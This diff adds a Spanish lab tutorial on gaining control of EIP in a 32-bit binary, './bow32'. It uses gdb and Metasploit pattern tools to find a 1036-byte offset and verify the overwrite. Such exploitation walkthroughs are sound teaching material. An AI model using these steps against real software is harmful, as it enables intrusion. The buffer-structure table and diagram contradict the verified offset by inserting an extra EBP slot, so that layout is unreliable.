@@ -1,0 +1,88 @@
+# Take Control of EIP
+
+El objetivo principal es obtener control del Instruction Pointer (EIP) para dirigir el flujo de ejecución.
+
+## Paso 1: Identificar el Crash
+
+```bash
+gdb -q ./bow32
+(gdb) run $(python -c "print '\x55' * 1200")
+```
+
+Resultado:
+```
+Program received signal SIGSEGV, Segmentation fault.
+0x55555555 in ?? ()
+```
+
+## Paso 2: Verificar Control de EIP
+
+```bash
+(gdb) info registers eip
+eip            0x55555555   0x55555555
+```
+
+EIP contiene `0x55555555` = nuestros bytes `\x55` → Tenemos control.
+
+## Paso 3: Determinar el Offset
+
+Usar Metasploit para crear patrón único:
+
+```bash
+# Crear patrón de 1200 bytes
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
+```
+
+```bash
+(gdb) run $(cat pattern.txt)
+Program received signal SIGSEGV, Segmentation fault.
+0x69423569 in ?? ()
+```
+
+Calcular offset:
+
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
+[*] Exact match at offset 1036
+```
+
+## Offset = 1036 bytes
+
+Esto significa:
+- 1036 bytes de padding para llegar al EIP
+- 4 bytes adicionales sobrescriben el EIP
+
+## Paso 4: Verificar el Offset
+
+```bash
+(gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")
+Program received signal SIGSEGV, Segmentation fault.
+0x66666666 in ?? ()
+```
+
+EIP = `0x66666666` → Offset confirmado.
+
+## Estructura del Buffer
+
+| Componente | Tamaño | Contenido |
+|------------|--------|-----------|
+| Padding | 1036 bytes | `\x55` |
+| EBP | 4 bytes | Sobrescrito |
+| EIP | 4 bytes | Dirección a controlar |
+
+## Resumen Visual
+
+```
+Buffer: [1036 bytes padding][4 bytes EBP][4 bytes EIP]
+                             ↑            ↑
+                          Offset       Control EIP
+```
+
+## Comandos Clave
+
+| Comando | Propósito |
+|---------|-----------|
+| `pattern_create.rb -l N` | Crear patrón único |
+| `pattern_offset.rb -q ADDR` | Calcular offset |
+| `info registers eip` | Ver EIP |
+| `run $(python -c "...")` | Ejecutar con payload |
